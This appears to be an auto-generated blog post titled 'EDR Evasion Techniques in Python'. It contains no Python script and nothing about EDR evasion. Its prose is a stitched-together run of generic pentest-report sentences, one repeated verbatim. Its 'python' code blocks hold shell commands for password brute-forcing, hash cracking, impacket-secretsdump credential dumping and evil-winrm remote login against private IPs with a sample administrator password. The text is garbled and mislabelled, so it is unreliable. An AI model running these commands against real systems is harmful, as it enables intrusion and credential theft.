---
TitleSEO: "EDR Evasion Techniques in Python | ZureFX"
TitlePost: "EDR Evasion Techniques — Python"
Author: "ZureFX"
Description: "A Python script for edr evasion techniques. Built for security research and automation."
Keywords: "go, fuzzer, automation, python, powershell, parser"
URL: "https://zurefx.github.io/scripting/script-edr-evasion-techniques-875.html"
URL_IMAGES: ""
Date: "2025-02-27"
Tags: "Go, Fuzzer, Automation, Python, PowerShell, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-edr-evasion-techniques-875"
Permalink: "/scripting/script-edr-evasion-techniques-875.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `dcomexec`
- `GetUserSPNs`
- `feroxbuster`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.118.80 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.82.23.49 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

```python
nmap -sCV -p139,587,3389 10.114.35.219 -oN scan.txt
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.21.178.181
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
nmap -sCV -p3268,9200,464 10.111.207.87 -oN scan.txt
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.117.226.82 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.50.161.205
gobuster dir -u http://10.20.226.136/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.130.16
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 14.59s
```
